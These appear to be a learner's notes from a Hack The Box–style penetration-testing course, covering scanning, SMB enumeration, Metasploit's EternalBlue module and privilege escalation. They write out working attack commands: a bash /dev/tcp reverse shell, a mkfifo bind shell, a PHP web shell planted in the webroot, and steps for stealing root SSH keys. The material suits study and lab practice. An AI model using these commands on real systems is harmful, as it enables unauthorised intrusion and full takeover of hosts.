Useful commands to get started

## <mark style="color:blue;">Working with ports and services</mark>

*   <mark style="color:yellow;">**netcat**</mark> : Command used for interacting with TCP/UDP ports.

    Connecting to shells\
    Connect to any listening port and interact with the service running on that port

    **netcat** 10.10.10.10 22 : Helps identify what service is running on a particular port while showing the version etc... This is called Banner grabbing

    **nc** -nv 10.129.42.253 21 : The nc command is the short way of netcat and here we are saying to output the version of the running service
*   <mark style="color:yellow;">**nmap**</mark>\*\* :\*\* Used for scanning ports

    **nmap** 10.126.10.10 : Will show us all available ports or open ports on this web server

    The state can have a value of 'filtered' which means that the firewall only accept specific IPs

    By default, this command only show TCP ports.

    **nmap** -sV -sC -p- 10.129.42.253 : The -sV to perform a version scan, -sC to get more info and -p- to scan all 65 535 ports

    The -sC parameter run by default some useful scripts, but we can run specific scripts :

    **nmap** --script \<script name> -p\<port> \<host>
*   <mark style="color:yellow;">**ftp**</mark>\*\* :\*\*

    **ftp** -p 10.129.42.253 : So here we connected to the service using ftp.
*   <mark style="color:yellow;">**smb**</mark>\*\* :\*\* Used by windows for sharing files (Allows users and admins to share folders and make them accessible remotely by other users.

    **nmap** --script smb-os-discovery.nse -p445 10.10.10.40 : So here we used a specific script to interact with smb and get the OS version.

    \*\*smbclient -\*\*N -L \\\\\\\10.129.42.15 : The smbclient can interact with smb shares. The -N supresses the password promt and the -L lists for us the available shares on remote host.

    \*\*smbclient -\*\*U bob \\\\\\\10.129.42.15\\\users : The -U means user so here we are trying to log in as the user bob so he will demand password and after that we can do ls for example and access different files etc...

    When connected to the client with SMB, can we use commands like cd to get into a directory and get command if we want to see the contents of a file...
*   <mark style="color:yellow;">**snmp**</mark>\*\* :\*\* Interacts with different equipments

    **snmpwalk** -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0

## <mark style="color:blue;">Expanding the terminal</mark>

* <mark style="color:yellow;">**tmux**</mark>\*\* :\*\* Can exapnd the terminal for example put 2 windows next to each other in one terminal. The default key to enter tmux commands is Ctrl+B

## <mark style="color:blue;">Web enumeration</mark>

*   <mark style="color:yellow;">**gobuster**</mark> dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt : gobuster is a tool that performs directory enumeration and let us check if we can uncover any hidden files or directories on the webserver that are not intended for public access. So gobuster let us do directory brute-forcing. Here, we run a simple scan using the dirb common.txt wordlist. There also may be essential resources hosted on subdomains, such as admin panels or applications with additional functionality that could be exploited. We can use `GoBuster` to enumerate available subdomains of a given domain using the `dns` flag to specify DNS mode.

    **gobuster** dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt : Here we are targeting the domain 'inlanefreight.com'. The scan below reveals several interesting subdomains that we could examine further

* <mark style="color:yellow;">**curl**</mark> : We can use curl to retrieve server header information from the command line

```shell-session

```

## <mark style="color:blue;">Certificates</mark>

SSL/TLS certificates are another potentially valuable source of information if HTTPS is in use

* Robots.txt : The robots.txt file can provide valuable information such as the location of private files and admin pages. In this case, we see that the robots.txt file contains two disallowed entries.

## <mark style="color:blue;">Public Exploits</mark>

Once we identify the services running on ports identified from our Nmap scan, the first step is to look if any of the applications/services have any public exploits. Public exploits can be found for web applications and other applications running on open ports, like SSH or ftp.

We can search for exploits of an application by using a tool called **searchsploit.** Before that we must install the **exploitdb** using the command :&#x20;

* sudo apt install **exploitdb -y**
* **searchsploit** openssh 7.2&#x20;

## <mark style="color:blue;">Metasploit primer</mark>

It's an excellent tool for pentesters. It contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets

* **msfconsole :** To run Metasploit, we can use the msfconsole command. Once we have metasploit running, we can search for our target application with the search exploit command. For example, we can search for the SMB vulnerability we identified previously

```shell-session
msf6 > search exploit eternalblue

```

We found one exploit for this service. We can use it by copying the full name of it and using use to use it.

```shell-session
msf6 > use exploit/windows/smb/ms17_010_psexec

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Before we can run the exploit, we need to configure its options. To view the options available to configure, we can use the show options command:

...SNIP...
```

Any option with `Required` set to `yes` needs to be set for the exploit to work. In this case, we only have options to set: `RHOSTS`, which means the IP of our target (this can be one IP, multiple IPs, or a file containing a list of IPs). We can set them with the `set` command:

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```

Once we have both options set, we can start the exploitation. However, before we run the script, we can run a check to ensure the server is vulnerable:

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
```

As we can see, the server is indeed vulnerable. Note that not every exploit in the `Metasploit Framework` supports the `check` function. Finally, we can use the `run` or `exploit` command to run the exploit:

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

As we can see, we have been able to gain admin access to the box and used the `shell` command to drop us into an interactive shell. These are basic examples of using `Metasploit` to exploit a vulnerability on a remote server. There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit

## <mark style="color:blue;">Shells</mark>

Once we compromise a system and exploit a vulnerability to execute commands on the compromised hosts remotely, we usually need a method of communicating with the system not to have to keep exploiting the same vulnerability to execute each command. To enumerate the system or take further control over it or within its network, we need a reliable connection that gives us direct access to the system's shell, i.e., `Bash` or `PowerShell.`

There are 3 types of shells :&#x20;

* Reverse Shell : Connects back to our system and gives us control through a reverse connection.
* Bind Shell : Waits for us to connect to it and gives us control once we do.
* Web Shell : Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output

## <mark style="color:blue;">Reverse shell</mark> &#x20;

It is the most common way. Once we identify a vulnerability on the remote host that allows remote code execution, we can start a `netcat` listener on our machine that listens on a specific port, say port `1234`. With this listener in place, we can execute a `reverse shell command` that connects the remote systems shell, i.e., `Bash` or `PowerShell` to our `netcat` listener, which gives us a reverse connection over the remote system.

*   The first step is to start a `netcat` listener on a port of our choosing:&#x20;

    ```shell-session
    nc -lvnp 1234

    listening on [any] 1234 ...
    ```

The -l means listen mode so to wait for a connection to connect to us. The -v is for verbose. The -n disbable DNS resolution and only connect from/to IPs, to speed up the connection, and the -p is the port number `netcat` is listening on, and the reverse connection should be sent to.&#x20;

However, first, we need to find our system's IP to send a reverse connection back to us. We can find our IP with the command : ip address. In fact, in our case we took the tun0 because we need a vpn to connect to our box machine but in the real world either we are directly connected or we connect remotely to the server.

After that, the command we execute depends on what operating system the compromised host runs on, i.e., Linux or Windows, and what applications and commands we can access.

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

We can utilize the exploit we have over the remote host to execute one of the above commands, i.e., through a Python exploit or a Metasploit module, to get a reverse connection. Once we do, we should receive a connection in our `netcat` listener:

```shell-session
nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, after we received a connection on our `netcat` listener, we were able to type our command and directly get its output back, right in our machine.

A `Reverse Shell` is handy when we want to get a quick, reliable connection to our compromised host. However, a `Reverse Shell` can be very fragile. Once the reverse shell command is stopped, or if we lose our connection for any reason, we would have to use the initial exploit to execute the reverse shell command again to regain our access.

## <mark style="color:blue;">Bind shell</mark> &#x20;

Unlike a `Reverse Shell` that connects to us, we will have to connect to it on the `targets'` listening port. Once we execute a `Bind Shell Command`, it will start listening on a port on the remote host and bind that host's shell, i.e., `Bash` or `PowerShell`'to that port. We have to connect to that port with `netcat`, and we will get control through a shell on that system.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Once we execute the bind shell command, we should have a shell waiting for us on the specified port. We can now connect to it.We can use `netcat` to connect to that port and get a connection to the shell:

```shell-session
nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, we are directly dropped into a bash session and can interact with the target system directly. Unlike a `Reverse Shell`, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.

Once we connect to a shell through Netcat, we will notice that we can only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.

we will use the `python/stty` method. In our `netcat` shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:

```shell-session
python -c 'import pty; pty.spawn("/bin/bash")'
```

After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:

&#x20; Upgrading TTY

```shell-session
www-data@remotehost$ ^Z

ebs123@htb[/htb]$ stty raw -echo
ebs123@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```

Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset` and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.

We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:

```shell-session
ebs123@htb[/htb]$ echo $TERM

xterm-256color
```

```shell-session
ebs123@htb[/htb]$ stty size

67 318
```

The first command showed us the `TERM` variable, and the second shows us the values for `rows` and `columns`, respectively. Now that we have our variables, we can go back to our `netcat` shell and use the following command to correct them:

```shell-session
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```

Once we do that, we should have a `netcat` shell that uses the terminal's full features, just like an SSH connection.

## <mark style="color:blue;">Web shell</mark> &#x20;

A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our command through HTTP request parameters such as `GET` or `POST` request parameters, executes our command, and prints its output back on the web page. First of all, we need to write our web shell that would take our command through a `GET` request. This is an example where we do it wih php.&#x20;

```php
<?php system($_REQUEST["cmd"]); ?>
```

Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. `shell.php` and upload it, and then access our uploaded file to execute commands.

However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:

| Web Server | Default Webroot        |
| ---------- | ---------------------- |
| `Apache`   | /var/www/html/         |
| `Nginx`    | /usr/local/nginx/html/ |
| `IIS`      | c:\inetpub\wwwroot\\   |
| `XAMPP`    | C:\xampp\htdocs\\      |

We can check these directories to see which webroot is in use and then use `echo` to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a `PHP` shell with the following command:

Code: bash

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

**Accessing Web Shell**

Once we write our web shell, we can either access it through a browser or by using `cURL`. We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:

Another option is to use `cURL`:

&#x20; Accessing Web Shell

```shell-session
ebs123@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, we can keep changing the command to get its output. A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on `80` or `443`, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again.

On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. Still, in extreme cases, it is possible to code a `Python` script to automate this process and give us a semi-interactive web shell right within our terminal.

## <mark style="color:blue;">Gaining full access</mark> &#x20;

Our initial access to a remote server is usually in the context of a low-privileged user, which would not give us complete access over the box. To gain full access, we will need to find an internal/local vulnerability that would escalate our privileges to the `root` user on `Linux` or the `administrator`/`SYSTEM` user on `Windows.`Once we gain initial access to a box, we want to thoroughly enumerate the box to find any potential vulnerabilities we can exploit to achieve a higher privilege level. We can find many checklists and cheat sheets online that have a collection of checks we can run and the commands to run these checks. One excellent resource is [HackTricks](https://book.hacktricks.xyz), which has an excellent checklist for both Linux and Windows local privilege escalation. Another excellent repository is [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), which also has checklists for both Linux and Windows. We must start experimenting with various commands and techniques and get familiar with them to understand multiple weaknesses that can lead to escalating our privileges. Many of the above commands may be automatically run with a script to go through the report and look for any weaknesses. We can run many scripts to automatically enumerate the server by running common commands that return any interesting findings. Some of the common Linux enumeration scripts include [LinEnum](https://github.com/rebootuser/LinEnum.git) and [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker), and for Windows include [Seatbelt](https://github.com/GhostPack/Seatbelt) and [JAWS](https://github.com/411Hall/JAWS). Another useful tool we may use for server enumeration is the [Privilege Escalation Awesome Scripts SUITE (PEASS)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.

Note: These scripts will run many commands known for identifying vulnerabilities and create a lot of "noise" that may trigger anti-virus software or security monitoring software that looks for these types of events. This may prevent the scripts from running or even trigger an alarm that the system has been compromised. In some instances, we may want to do a manual enumeration instead of running scripts.

Let us take an example of running the Linux script from `PEASS` called `LinPEAS`:

```shell-session
./linpeas.sh
...SNIP...

OS: Linux version 3.9.0-73-generic
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
...SNIP...
```

As we can see, once the script runs, it starts collecting information and displaying it in an excellent report. Let us discuss some of the vulnerabilities that we should look for in the output from these scripts.

### Kernel Exploits :&#x20;

Whenever we encounter a server running an old operating system, we should start by looking for potential kernel vulnerabilities that may exist. For example, the above script showed us the Linux version to be `3.9.0-73-generic`. If we Google exploits for this version or use `searchsploit`, we would find a `CVE-2016-5195`, otherwise known as `DirtyCow`. We can search for and download the [DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs) exploit and run it on the server to gain root access.

### Vulnerable Software :&#x20;

Another thing we should look for is installed software. For example, we can use the `dpkg -l` command on Linux or look at `C:\Program Files` in Windows to see what software is installed on the system. We should look for public exploits for any installed software, especially if any older versions are in use, containing unpatched vulnerabilities.

### User Privileges :&#x20;

Another critical aspect to look for after gaining access to a server is the privileges available to the user we have access to.

```shell-session
sudo -l

[sudo] password for user1:
...SNIP...

User user1 may run the following commands on ExampleServer:
    (ALL : ALL) ALL
```

The above output says that we can run all commands with `sudo`, which gives us complete access.

Once we find a particular application we can run with `sudo`, we can look for ways to exploit it to get a shell as the root user. [GTFOBins](https://gtfobins.github.io) contains a list of commands and how they can be exploited through `sudo`. We can search for the application we have `sudo` privilege over, and if it exists, it may tell us the exact command we should execute to gain root access using the `sudo` privilege we have.

### Scheduled Tasks :&#x20;

In both Linux and Windows, there are methods to have scripts run at specific intervals to carry out a task. Some examples are having an anti-virus scan running every hour or a backup script that runs every 30 minutes. There are usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:

1. Add new scheduled tasks/cron jobs
2. Trick them to execute a malicious software

The easiest way is to check if we are allowed to add new scheduled tasks. In Linux, a common form of maintaining scheduled tasks is through `Cron Jobs`. There are specific directories that we may be able to utilize to add new cron jobs if we have the `write` permissions over them. These include:

1. `/etc/crontab`
2. `/etc/cron.d`
3. `/var/spool/cron/crontabs/root`

If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.

### Exposed Credentials :&#x20;

Next, we can look for files we can read and see if they contain any exposed credentials. This is very common with `configuration` files, `log` files, and user history files (`bash_history` in Linux and `PSReadLine` in Windows)

### SSH Keys :&#x20;

Let us discuss SSH keys. If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. If we can read the `/root/.ssh/` directory and can read the `id_rsa` file, we can copy it to our machine and use the `-i` flag to log in with it:

```shell-session
ebs123@htb[/htb]$ vim id_rsa
ebs123@htb[/htb]$ chmod 600 id_rsa
ebs123@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa
```
